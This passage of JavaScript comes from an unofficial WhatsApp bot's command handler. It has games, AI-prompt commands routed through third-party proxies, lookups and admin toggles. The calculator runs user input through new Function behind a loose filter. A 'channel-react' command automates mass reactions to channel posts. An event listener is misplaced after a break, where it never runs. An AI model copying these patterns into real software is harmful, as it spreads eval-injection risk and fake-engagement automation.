            case "urban": {
                if (!text) return reply("📚 *Example:* urban sus");

                try {
                    const res = await axios.get(`https://api.urbandictionary.com/v0/define?term=${encodeURIComponent(text)}`);
                    const defs = res.data?.list;
                    if (!defs || !defs.length) return reply(`🔍 No definitions found for "${text}"`);

                    const top = defs[0];
                    const msg = `📖 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Urban*\n\n📌 *${top.word}*\n\n${top.definition}\n\n💬 *Example:* ${top.example}`;
                    reply(msg);
                } catch (e) {
                    console.error("URBAN ERROR:", e);
                    reply("❌ *Dictionary is offline* • Try again later");
                }
            }
                break;

            case 'ship': {
                if (!text) return reply(`💘 *Usage:* ${command} name1 & name2`);

                let names = text.split("&");
                if (names.length < 2) return reply("⚠️ Format: name1 & name2");

                let name1 = names[0].trim();
                let name2 = names[1].trim();

                let percentage = Math.floor(Math.random() * 100) + 1;
                let bar = "❤️".repeat(Math.floor(percentage / 10)) + "🤍".repeat(10 - Math.floor(percentage / 10));

                reply(`💞 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Ship*\n\n${name1} 💘 ${name2}\n\nCompatibility: *${percentage}%*\n${bar}`);
            }
                break;

            case 'rewrite': {
                if (!text) return reply(`✍️ *Usage:* ${command} your text here`);

                try {
                    async function openaiRewrite(input) {
                        let response = await axios.post("https://chateverywhere.app/api/chat/", {
                            "model": { "id": "gpt-4", "name": "GPT-4" },
                            "messages": [{
                                "content": `Rewrite this to be clear and grammatically correct:\n"${input}"`,
                                "role": "user"
                            }],
                            "temperature": 0.5
                        });
                        return response.data;
                    }

                    let result = await openaiRewrite(text);
                    reply(`✍️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Rewrite*\n\n${result}`);
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Rewrite failed* • Editor is on break");
                }
            }
                break;

            case 'rate': {
                if (!text) return reply(`📊 *Usage:* ${command} something to rate`);

                let percentage = Math.floor(Math.random() * 100) + 1;
                let bar = "⭐".repeat(Math.floor(percentage / 10)) + "✩".repeat(10 - Math.floor(percentage / 10));

                reply(`📊 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Rate*\n\n${text}\n\n*${percentage}%* ${bar}`);
            }
                break;

            case "solve": {
                const a = Math.floor(Math.random() * 50) + 1;
                const b = Math.floor(Math.random() * 50) + 1;
                const answer = a + b;

                reply(`➕ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Math*\n\nSolve: ${a} + ${b}\nReply with: mathanswer ${answer}`);
            }
                break;

            case 'story': {
                if (!text) return reply(`📖 *Usage:* ${command} a brave warrior`);

                try {
                    async function openaiStory(topic) {
                        let response = await axios.post("https://chateverywhere.app/api/chat/", {
                            "model": { "id": "gpt-4", "name": "GPT-4" },
                            "messages": [{
                                "content": `Write a short creative story about: ${topic}`,
                                "role": "user"
                            }],
                            "temperature": 0.8
                        });
                        return response.data;
                    }

                    let result = await openaiStory(text);
                    reply(`📖 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Story*\n\n${result}`);
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Storyteller is sleeping* • Try again later");
                }
            }
                break;

            case 'cartoonify': {
                if (!m.quoted || !/image/.test(m.quoted.mtype))
                    return reply(`🖼️ *Reply to an image* with ${command}`);

                try {
                    let media = await downloadAndSaveMediaMessage(m.quoted);
                    let fileData = fs.readFileSync(media);

                    let response = await axios.post("https://api.itsrose.life/image/cartoonify", fileData, {
                        headers: { "Content-Type": "application/octet-stream" },
                        responseType: "arraybuffer"
                    });

                    fs.writeFileSync("cartoon.png", response.data);

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: fs.readFileSync("cartoon.png"),
                            caption: "🎨 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Cartoonify*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Cartoonify failed* • Try another image");
                }
            }
                break;

            case 'wouldyou': {
                try {
                    const questions = [
                        "Fly 🕊️ or be invisible 👻?",
                        "Always 10 minutes late ⏰ or 20 minutes early ⌛?",
                        "Live without music 🎶 or without movies 🎥?",
                        "Be rich 💰 and sad 😢, or poor 💸 but happy 😁?",
                        "Eat pizza 🍕 forever or rice 🍚 forever?",
                        "Time travel to past ⏳ or future 🚀?",
                        "Fight 1 horse-sized duck 🦆 or 100 duck-sized horses 🐴?",
                        "Never use social media 📵 or never watch TV 📺?",
                        "Have super strength 💪 or super intelligence 🧠?",
                        "Speak in rhymes 🎤 or sing instead of talk 🎶?"
                    ];

                    const randomQ = questions[Math.floor(Math.random() * questions.length)];
                    reply(`🤔 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Would You Rather*\n\nWould you rather ${randomQ}`);
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Question generator failed* • Try again later");
                }
            }
                break;

            case 'truthdare':
            case 'tod': {
                if (!text) return reply(`🎲 *Usage:* ${command} truth | dare`);

                try {
                    async function openaiTruthDare(type) {
                        let response = await axios.post("https://chateverywhere.app/api/chat/", {
                            "model": { "id": "gpt-4", "name": "GPT-4" },
                            "messages": [{
                                "content": `Generate a fun, creative ${type} question for Truth or Dare. Keep it short and engaging.`,
                                "role": "user"
                            }],
                            "temperature": 0.8
                        });
                        return response.data;
                    }

                    let type = text.toLowerCase().includes("truth") ? "truth" :
                        text.toLowerCase().includes("dare") ? "dare" : null;

                    if (!type) return reply("⚠️ Choose *truth* or *dare*");

                    let result = await openaiTruthDare(type);
                    reply(`🎲 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ${type.toUpperCase()}*\n\n${result}`);

                } catch (e) {
                    console.error(e);
                    reply("❌ *Truth/Dare failed* • Game master is sleeping");
                }
            }
                break;

            case 'github': {
                if (!text) return reply(`👨‍💻 *Usage:* ${command} username`);

                try {
                    let res = await axios.get(`https://api.github.com/users/${encodeURIComponent(text)}`);
                    let user = res.data;

                    if (!user || !user.login) return reply("🔍 *User not found*");

                    let profileInfo = `👨‍💻 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 GitHub*\n\n` +
                        `📌 *${user.name || user.login}*\n` +
                        `📍 ${user.location || "Location hidden"}\n` +
                        `📦 Repos: ${user.public_repos} | 👥 Followers: ${user.followers}\n` +
                        `🔗 ${user.html_url}`;

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: user.avatar_url },
                            caption: profileInfo
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *GitHub fetch failed* • Try again later");
                }
            }
                break;

            case 'npm': {
                if (!text) return reply(`📦 *Usage:* ${command} package-name`);

                try {
                    let res = await axios.get(`https://registry.npmjs.org/${encodeURIComponent(text)}`);
                    let data = res.data;

                    if (!data.name) return reply("🔍 *Package not found*");

                    let latestVersion = data['dist-tags']?.latest;
                    let info = data.versions[latestVersion];

                    let npmInfo = `📦 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 NPM*\n\n` +
                        `📌 *${data.name}* v${latestVersion}\n` +
                        `📝 ${data.description || "No description"}\n` +
                        `👤 ${info?.author?.name || "Unknown author"}\n` +
                        `📦 License: ${info?.license || "Unknown"}\n` +
                        `🔗 https://www.npmjs.com/package/${data.name}`;

                    reply(npmInfo);
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *NPM fetch failed* • Registry might be down");
                }
            }
                break;

            case 'poem': {
                if (!text) return reply(`📝 *Usage:* ${command} love under stars`);

                try {
                    async function openaiPoem(topic) {
                        let response = await axios.post("https://chateverywhere.app/api/chat/", {
                            "model": { "id": "gpt-4", "name": "GPT-4" },
                            "messages": [{
                                "content": `Write a beautiful, original poem about: ${topic}`,
                                "role": "user"
                            }],
                            "temperature": 0.7
                        });
                        return response.data;
                    }

                    let result = await openaiPoem(text);
                    reply(`📝 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Poem*\n\n${result}`);
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Poet is on strike* • Try again later");
                }
            }
                break;

            case 'metaai': {
                if (!text) return reply(`🤖 *Usage:* ${command} your question`);

                try {
                    let response = await axios.post("https://chateverywhere.app/api/chat/", {
                        "model": { "id": "gpt-4", "name": "GPT-4" },
                        "messages": [{
                            "content": text,
                            "role": "user"
                        }],
                        "temperature": 0.5
                    });

                    let result = response.data;
                    reply(`🤖 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 AI*\n\n${result}`);
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *AI is thinking too hard* • Try again later");
                }
            }
                break;

            case 'codeai': {
                if (!text) return reply(`👨‍💻 *Usage:* ${command} write a Python function`);

                try {
                    let response = await axios.post("https://chateverywhere.app/api/chat/", {
                        "model": { "id": "gpt-4", "name": "GPT-4" },
                        "messages": [{
                            "content": `You are a coding assistant. Provide clean, working code:\n\n${text}`,
                            "role": "user"
                        }],
                        "temperature": 0.4
                    });

                    let result = response.data;
                    reply(`👨‍💻 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Code*\n\n${result}`);
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Code generator crashed* • Try again later");
                }
            }
                break;

            case 'triviaai': {
                try {
                    let response = await axios.post("https://chateverywhere.app/api/chat/", {
                        "model": { "id": "gpt-4", "name": "GPT-4" },
                        "messages": [{
                            "content": "Give me a random trivia question with 4 options A-D. Format: Question\n\nA) \nB) \nC) \nD)\n\n✅ Answer:",
                            "role": "user"
                        }],
                        "temperature": 0.7
                    });

                    let result = response.data;
                    reply(`🎲 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Trivia*\n\n${result}`);
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Trivia machine broke* • Try again later");
                }
            }
                break;

            case 'storyai': {
                if (!text) return reply(`📖 *Usage:* ${command} a brave dog in space`);

                try {
                    let response = await axios.post("https://chateverywhere.app/api/chat/", {
                        "model": { "id": "gpt-4", "name": "GPT-4" },
                        "messages": [{
                            "content": `Write a short story about: ${text}`,
                            "role": "user"
                        }],
                        "temperature": 0.7
                    });

                    reply(`📖 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Story*\n\n${response.data}`);
                } catch (e) {
                    reply("❌ *Story generator failed* • Try again later");
                }
            }
                break;

            case 'photoai': {
                if (!text) return reply(`🖼️ *Usage:* ${prefix + command} a cat wearing sunglasses`);

                try {
                    let url = `https://image.pollinations.ai/prompt/${encodeURIComponent(text)}`;

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url },
                            caption: `🎨 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 AI Art*\n\nPrompt: ${text}`
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("❌ *AI art generator failed* • Try again later");
                }
            }
                break;

            case 'welcome': {
                // --- Permission & Context Checks ---
                if (!isCreator) {
                    return reply(`🔒 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Welcome*\n\nThis command is restricted to the bot owner.`);
                }
                if (!m.isGroup) {
                    return reply(`👥 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Welcome*\n\nThis command can only be used within groups.`);
                }

                // --- Toggle Logic (On/Off) ---
                if (args[0] === 'on') {
                    setSetting(m.chat, "welcome", true);
                    return reply(`✅ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Welcome*\n\nWelcome messages have been activated for this group. New members will now be greeted.`);
                }
                else if (args[0] === 'off') {
                    setSetting(m.chat, "welcome", false);
                    return reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Welcome*\n\nWelcome messages have been deactivated for this group.`);
                }
                else if (args[0] === 'set') {
                    // --- New Feature: Set Custom Welcome Message ---
                    const customMessage = args.slice(1).join(' ');
                    if (!customMessage) {
                        return reply(`📝 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Welcome*\n\nPlease provide a welcome message after the command.\n\nExample:\n${prefix}welcome set Welcome to the group, @user!`);
                    }
                    setSetting(m.chat, "welcomeMessage", customMessage);
                    return reply(`✅ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Welcome*\n\nCustom welcome message has been set.`);
                }
                else {
                    // --- Default: Display Help ---
                    reply(`⚙️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Welcome — Settings*\n\n` +
                        `▸ *${prefix}welcome on* — Enable welcome messages\n` +
                        `▸ *${prefix}welcome off* — Disable welcome messages\n` +
                        `▸ *${prefix}welcome set <text>* — Set a custom welcome message (use @user to tag)\n\n` +
                        `_Default message: "Welcome @user to the group!_"`);
                }
            }
                break;

                // =========================================================================
                // Place this function outside of your case blocks, likely in a main handler
                // This listens for new group participants
                // =========================================================================
                devtrust.ev.on('group-participants.update', async (update) => {
                    const { id, participants, action } = update;

                    // Only proceed if the action is 'add' (someone joined)
                    if (action !== 'add') return;

                    // Check if welcome messages are enabled for this group
                    const welcomeEnabled = getSetting(id, "welcome"); // You need to implement this getter
                    if (!welcomeEnabled) return;

                    // Fetch the custom message or use default
                    let customMessage = getSetting(id, "welcomeMessage"); // You need to implement this getter
                    if (!customMessage) {
                        customMessage = "Welcome @user to the group!"; // Default message
                    }

                    const groupMetadata = await devtrust.groupMetadata(id);
                    const groupName = groupMetadata?.subject;

                    // Process each new participant
                    for (let jid of participants) {
                        try {
                            // --- Attempt to fetch the new user's profile picture ---
                            let profilePicUrl;
                            try {
                                profilePicUrl = await devtrust.profilePictureUrl(jid, 'image');
                            } catch {
                                // Fallback image if profile picture can't be fetched
                                profilePicUrl = 'https://i.ibb.co/rGr4bWW8/image1.jpg';
                            }

                            // --- Personalize the message ---
                            // Replace @user with the actual mention
                            let personalizedMessage = customMessage.replace('@user', `@${jid.split('@')[0]}`);

                            // You can add more placeholders here, e.g., @group for group name
                            personalizedMessage = personalizedMessage.replace('@group', groupName);

                            // --- Send the welcome message with the image ---
                            await devtrust.sendMessage(id, addNewsletterContext({
                                image: { url: profilePicUrl },
                                caption: `👋 *Welcome to ${groupName}*\n\n${personalizedMessage}`,
                                mentions: [jid] // This ensures the user is tagged
                            }));

                        } catch (error) {
                            console.error(`Error sending welcome message for ${jid}:`, error);
                        }
                    }
                });
                
case 'channel-react':
case 'channelreact': {
    try {
        const commandInput = (text || '').trim();

        if (!commandInput) {
            return reply('❌ *Usage:* `/channel-react <channel_link_or_jid>, <emoji>`\n\n*Example:* `/channel-react https://whatsapp.com/channel/xxx, 🔥`');
        }

        const [targetInput, customEmoji] = commandInput.split(',').map(item => item ? item.trim() : '');

        if (!targetInput) {
            return reply('❌ Please provide a valid channel link or JID.');
        }

        const randomEmojis = ['👍', '❤️', '🔥', '👏', '😂', '🎉', '😮', '🙌', '⭐', '⚡'];
        let newsletterJid = '';

        // 1. Resolve Channel JID
        try {
            if (targetInput.includes('whatsapp.com/channel/')) {
                const code = targetInput.split('whatsapp.com/channel/')[1].split('/')[0].trim();
                const metadata = await devtrust.newsletterMetadata('invite', code);

                if (!metadata || !metadata.id) {
                    return reply('❌ *Channel not found!* Invalid or expired invite link.');
                }
                newsletterJid = metadata.id;
            } else if (targetInput.endsWith('@newsletter')) {
                newsletterJid = targetInput;
            } else {
                return reply('❌ *Invalid target!* Please provide a valid WhatsApp Channel link or newsletter JID (`...@newsletter`).');
            }
        } catch (metaErr) {
            console.error('Metadata resolve error:', metaErr);
            return reply(`❌ *Failed to resolve channel:* ${metaErr.message || 'Unknown error'}`);
        }

        await reply('⏳ *Processing channel subscription and fetching messages...*');

        // 2. Follow/Subscribe (ignore if already following)
        try {
            await devtrust.newsletterFollow(newsletterJid);
        } catch (followErr) {
            // Ignore if already following
        }

        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

        // 3. Fetch recent channel messages
        // IMPORTANT: newsletterFetchMessages requires (jid, count, since, after)
        const fetchCount = 50;
        let messages;
        try {
            messages = await devtrust.newsletterFetchMessages(newsletterJid, fetchCount, 0, 0);
        } catch (fetchErr) {
            console.error('Fetch messages error:', fetchErr);
            return reply(`❌ *Failed to fetch messages:* ${fetchErr.message || 'Unknown error'}`);
        }

        if (!messages || messages.length === 0) {
            return reply('⚠️ No messages found in the target channel.');
        }

        await reply(`🚀 *Starting reaction process for ${messages.length} messages...*`);

        let successCount = 0;

        for (const msg of messages) {
            try {
                const emojiToUse = customEmoji || randomEmojis[Math.floor(Math.random() * randomEmojis.length)];
                await devtrust.newsletterReactMessage(newsletterJid, msg.serverMsgId, emojiToUse);
                successCount++;
            } catch (reactErr) {
                console.error(`Failed to react to message ${msg.serverMsgId}:`, reactErr);
            }
            await sleep(1000);
        }

        await devtrust.sendMessage(m.chat, {
            text: `✅ *Task Completed Successfully!*\n\n• *Target:* \`${newsletterJid}\`\n• *Total Reacted:* ${successCount}/${messages.length}\n• *Emoji Mode:* ${customEmoji ? `Custom (${customEmoji})` : 'Random'}`
        }, { quoted: m });

    } catch (err) {
        console.error('Error in channel-react:', err);
        reply(`❌ *Failed to execute channel-react command:* ${err.message || 'Unknown error'}`);
    }
}
break;

            case 'ffstalk': {
                if (!args[0]) return reply(`🎮 *Usage:* ${command} FF_ID\nExample: ${command} 8533270051`);

                const ffId = args[0];
                const apiUrl = `https://apis.prexzyvilla.site/stalk/ffstalk?id=${ffId}`;

                try {
                    await devtrust.sendMessage(m?.chat, { react: { text: `🔍`, key: m?.key } });

                    const response = await axios.get(apiUrl);
                    const data = response.data;

                    if (!data.status) return reply("❌ *Player not found* • Check the ID");

                    const { nickname, region, open_id, img_url } = data.data;

                    const message = `🎮 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Free Fire*\n\n` +
                        `👤 *${nickname}*\n` +
                        `🆔 ID: ${open_id}\n` +
                        `🌏 Region: ${region}`;

                    await devtrust.sendMessage(m?.chat,
                        addNewsletterContext({
                            image: { url: img_url },
                            caption: message
                        }),
                        { quoted: m }
                    );

                } catch (error) {
                    console.error('FF Stalk Error:', error);
                    reply("❌ *Free Fire stalk failed* • Try again later");
                }
                break;
            }

            case 'npmstalk': {
                if (!text) return reply(`📦 *Usage:* ${command} package-name`);

                await devtrust.sendMessage(m.chat, { react: { text: `📦`, key: m.key } });

                try {
                    const res = await axios.get(`https://www.dark-yasiya-api.site/other/npmstalk?package=${encodeURIComponent(text)}`);
                    const pkg = res.data?.result;

                    if (!res.data?.status || !pkg) {
                        return reply(`🔍 *Package "${text}" not found*`);
                    }

                    const info = `📦 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 NPM Stats*\n\n` +
                        `📌 *${pkg.name}*\n` +
                        `🆚 Latest: v${pkg.versionLatest}\n` +
                        `📦 Published: v${pkg.versionPublish}\n` +
                        `📬 Updates: ${pkg.versionUpdate}x\n` +
                        `🪐 First: ${pkg.publishTime}\n` +
                        `🔥 Last: ${pkg.latestPublishTime}`;

                    reply(info);

                } catch (e) {
                    console.error('NPM Info Error:', e);
                    reply(`❌ *NPM fetch failed* • ${e.message}`);
                }
                break;
            }
            case "calculator": {
                try {
                    const val = text
                        .replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
                        .replace(/×/g, '*')
                        .replace(/÷/g, '/')
                        .replace(/π|pi/gi, 'Math.PI')
                        .replace(/e/gi, 'Math.E')
                        .replace(/\/+/g, '/')
                        .replace(/\++/g, '+')
                        .replace(/-+/g, '-');

                    const format = val
                        .replace(/Math\.PI/g, 'π')
                        .replace(/Math\.E/g, 'e')
                        .replace(/\//g, '÷')
                        .replace(/\*/g, '×');

                    const result = (new Function('return ' + val))();

                    if (!result) throw new Error('Invalid calculation');

                    reply(`🧮 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Math*\n\n${format} = ${result}`);
                } catch (e) {
                    reply(`❌ *Invalid expression*\nUse: 0-9, +, -, *, /, ×, ÷, π, e, (, )`);
                }
                break;
            }

            case 'setsudo': case 'sudo': case 'addsudo': {
                if (!isCreator && !isSudo)
                    return reply('🔒 *Owner/Sudo only*');

                let number;
                if (quoted) {
                    number = quoted.sender.split('@')[0];
                } else if (args[0]) {
                    number = args[0];
                }

                if (!number || !/^\d+$/.test(number)) {
                    return reply('❌ *Valid number required* • Reply or provide number');
                }

                const jid = number + '@s.whatsapp.net';
                const sudoList = loadSudoList();

                if (sudoList.includes(jid))
                    return reply(`⚠️ @${number} *already in sudo list*`);

                sudoList.push(jid);
                saveSudoList(sudoList);

                reply(`✅ @${number} *added to sudo list*`);
            }
                break;

            case 'delsudo': {
                if (!isCreator && !isSudo)
                    return reply('🔒 *Owner/Sudo only*');

                let number;
                if (quoted) {
                    number = quoted.sender.split('@')[0];
                } else if (args[0]) {
                    number = args[0];
                }

                if (!number || !/^\d+$/.test(number)) {
                    return reply('❌ *Valid number required*');
                }

                const jid = number + '@s.whatsapp.net';
                const sudoList = loadSudoList();

                if (!sudoList.includes(jid))
                    return reply(`⚠️ @${number} *not in sudo list*`);

                const updatedList = sudoList.filter((user) => user !== jid);
                saveSudoList(updatedList);

                reply(`✅ @${number} *removed from sudo list*`);
            }
                break;

            case 'getsudo': case 'listsudo': {
                if (!isCreator && !isSudo)
                    return reply('🔒 *Owner/Sudo only*');

                const sudoList = loadSudoList();
                if (sudoList.length === 0)
                    return reply('📭 *Sudo list is empty*');

                const sudoNumbers = sudoList.map((jid) => jid.split('@')[0]).join('\n• ');
                reply(`👥 *Sudo List*\n\n• ${sudoNumbers}`);
            }
                break;

            case "autobio": {
                if (!isCreator && !isSudo)
                    return reply('🔒 *Owner/Sudo only*');

                if (!args[0]) return reply("⚙️ *Usage:* autobio on/off");

                if (args[0].toLowerCase() === "on") {
                    setSetting(m.sender, "autobio", true);
                    reply("✅ *Auto bio enabled* • Status will update automatically");
                } else if (args[0].toLowerCase() === "off") {
                    setSetting(m.sender, "autobio", false);
                    reply("❌ *Auto bio disabled*");
                } else reply("⚙️ *Usage:* autobio on/off");
            }
                break;

            case "autoread": {
                if (!isCreator && !isSudo)
                    return reply('🔒 *Owner/Sudo only*');

                if (!args[0]) return reply("⚙️ *Usage:* autoread on/off");

                if (args[0].toLowerCase() === "on") {
                    setSetting(m.sender, "autoread", true);
                    reply("✅ *Auto read enabled* • Messages auto-read");
                } else if (args[0].toLowerCase() === "off") {
                    setSetting(m.sender, "autoread", false);
                    reply("❌ *Auto read disabled*");
                } else reply("⚙️ *Usage:* autoread on/off");
            }
                break;

            case "autoviewstatus": {
                if (!isCreator && !isSudo)
                    return reply('🔒 *Owner/Sudo only*');

                if (!args[0]) return reply("⚙️ *Usage:* autoviewstatus on/off");

                if (args[0].toLowerCase() === "on") {
                    setSetting(m.sender, "autoViewStatus", true);
                    reply("✅ *Auto view status enabled* • Stories auto-viewed");
                } else if (args[0].toLowerCase() === "off") {
                    setSetting(m.sender, "autoViewStatus", false);
                    reply("❌ *Auto view status disabled*");
                } else reply("⚙️ *Usage:* autoviewstatus on/off");
            }
                break;

            case "autotyping": {
                if (!isCreator && !isSudo)
                    return reply('🔒 *Owner/Sudo only*');

                if (!args[0]) return reply("⚙️ *Usage:* autotyping on/off");
                if (!m.isGroup) return reply("👥 *Groups only*");

                if (args[0].toLowerCase() === "on") {
                    setSetting(m.chat, "autoTyping", true);
                    reply("✅ *Auto typing enabled* • Bot shows typing");
                } else if (args[0].toLowerCase() === "off") {
                    setSetting(m.chat, "autoTyping", false);
                    reply("❌ *Auto typing disabled*");
                } else reply("⚙️ *Usage:* autotyping on/off");
            }
                break;

            case "autorecording": {
                if (!isCreator && !isSudo)
                    return reply('🔒 *Owner/Sudo only*');

                if (!args[0]) return reply("⚙️ *Usage:* autorecording on/off");
                if (!m.isGroup) return reply("👥 *Groups only*");

                if (args[0].toLowerCase() === "on") {
                    setSetting(m.chat, "autoRecording", true);
                    reply("✅ *Auto recording enabled* • Bot shows recording");
                } else if (args[0].toLowerCase() === "off") {
                    setSetting(m.chat, "autoRecording", false);
                    reply("❌ *Auto recording disabled*");
                } else reply("⚙️ *Usage:* autorecording on/off");
            }
                break;

            case "autorecordtype": {
                if (!isAdmins && !isCreator)
                    return reply('🔒 *Admins/Owner only*');

                if (!args[0]) return reply("⚙️ *Usage:* autorecordtype on/off");
                if (!m.isGroup) return reply("👥 *Groups only*");

                if (args[0].toLowerCase() === "on") {
                    setSetting(m.chat, "autoRecordType", true);
                    reply("✅ *Auto record type enabled* • Random typing/recording");
                } else if (args[0].toLowerCase() === "off") {
                    setSetting(m.chat, "autoRecordType", false);
                    reply("❌ *Auto record type disabled*");
                } else reply("⚙️ *Usage:* autorecordtype on/off");
            }
                break;

            case "autoreact": {
                if (!isAdmins && !isCreator)
                    return reply('🔒 *Admins/Owner only*');

                if (!args[0]) return reply("⚙️ *Usage:* autoreact on/off");
                if (!m.isGroup) return reply("👥 *Groups only*");

                if (args[0].toLowerCase() === "on") {
                    setSetting(m.chat, "autoReact", true);
                    reply("✅ *Auto react enabled* • Messages get random reactions");
                } else if (args[0].toLowerCase() === "off") {
                    setSetting(m.chat, "autoReact", false);
                    reply("❌ *Auto react disabled*");
                } else reply("⚙️ *Usage:* autoreact on/off");
            }
                break;

            case "ban": {
                if (!isCreator) return reply('🔒 *Owner only*');

                if (!args[0]) return reply("⚙️ *Usage:* ban @user");

                let user = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
                setSetting(user, "banned", true);
                reply(`🚫 @${user.split("@")[0]} * banned * `, [user]);
            }
                break;

            case "unban": {
                if (!isCreator) return reply('🔒 *Owner only*');

                if (!args[0]) return reply("⚙️ *Usage:* unban @user");

                let user = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
                setSetting(user, "banned", false);
                reply(`✅ @${user.split("@")[0]} * unbanned * `, [user]);
            }
                break;

            case "autoreply": {
                if (!isCreator) return reply('🔒 *Owner only*');

                if (!args[0]) return reply("⚙️ *Usage:* autoreply on/off");

                if (args[0].toLowerCase() === "on") {
                    setSetting(m.chat, "feature.autoreply", true);
                    reply("✅ *Auto reply enabled* • Bot responds to keywords");
                } else if (args[0].toLowerCase() === "off") {
                    setSetting(m.chat, "feature.autoreply", false);
                    reply("❌ *Auto reply disabled*");
                } else reply("⚙️ *Usage:* autoreply on/off");
            }
                break;

            case "antibadword": {
                if (!isCreator && !isSudo)
                    return reply('🔒 *Owner/Sudo only*');

                if (!args[0]) return reply("⚙️ *Usage:* antibadword on/off");

                if (args[0].toLowerCase() === "on") {
                    setSetting(m.chat, "feature.antibadword", true);
                    reply("✅ *Anti bad word enabled* • Bad words filtered");
                } else if (args[0].toLowerCase() === "off") {
                    setSetting(m.chat, "feature.antibadword", false);
                    reply("❌ *Anti bad word disabled*");
                } else reply("⚙️ *Usage:* antibadword on/off");
            }
                break;

            case "antibot": {
                if (!isCreator && !isSudo)
                    return reply('🔒 *Owner/Sudo only*');

                if (!args[0]) return reply("⚙️ *Usage:* antibot on/off");

                if (args[0].toLowerCase() === "on") {
                    setSetting(m.chat, "feature.antibot", true);
                    reply("✅ *Anti bot enabled* • Bot prefixes blocked");
                } else if (args[0].toLowerCase() === "off") {
                    setSetting(m.chat, "feature.antibot", false);
                    reply("❌ *Anti bot disabled*");
                } else reply("⚙️ *Usage:* antibot on/off");
            }
                break;

            case "owner": {
                const ownerName = "*NIZAMANI*";
                const ownerNumber = "13252318920";
                const displayTag = "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗";

                let vcard = `BEGIN: VCARD
                VERSION: 3.0
                FN:${ownerName}
                TEL; type = CELL; type = VOICE; waid = ${ownerNumber}: +${ownerNumber}
                END: VCARD`;

                let caption = `👑 * 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Owner *\n\n📱 wa.me / ${ownerNumber} \n💬 DM for support / requests`;

                await devtrust.sendMessage(m.chat, {
                    contacts: { displayName: displayTag, contacts: [{ vcard }] }
                }, { quoted: m });

                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        text: caption,
                        mentions: [m.sender]
                    }),
                    { quoted: m }
                );
            }
                break;

            case "repo": {
                const tgUsername = "t.me/SalarWC";
                const tgChannel = "https://t.me/SalarKingMD";
                const waChannel = "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r";

                let caption = `📂 * 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Repository *\n\n` +
                    `🤖 Bot 1: https://salarking.page.gd` +
                    `🤖 Bot 2: https://wa.me/13252318920\n\n` +
                    `📢 Updates:\n${tgChannel}\n${waChannel}`;

                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        text: caption,
                        mentions: [m.sender]
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'url':
            case 'tourl': {
                let q = m.quoted ? m.quoted : m;
                if (!q || !q.download) return reply(`🖼️ *Reply to an image/video* with ${prefix + command}`);

                let mime = q.mimetype || '';
                if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
                    return reply('❌ *Only images/MP4 supported*');
                }

                let media;
                try {
                    media = await q.download();
                } catch (error) {
                    return reply('❌ *Download failed*');
                }

                const uploadImage = require('./allfunc/Data6');
                const uploadFile = require('./allfunc/Data7');

                let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
                let link;
                try {
                    link = await (isTele ? uploadImage : uploadFile)(media);
                } catch (error) {
                    return reply('❌ *Upload failed*');
                }

                reply(`✅ *Uploaded*\n${link}`);
            }
                break;  // ← 'url' case ENDS here

                // ============ UPLOAD TO CATBOX FUNCTION ============
                // This goes HERE - between cases, available to ALL commands
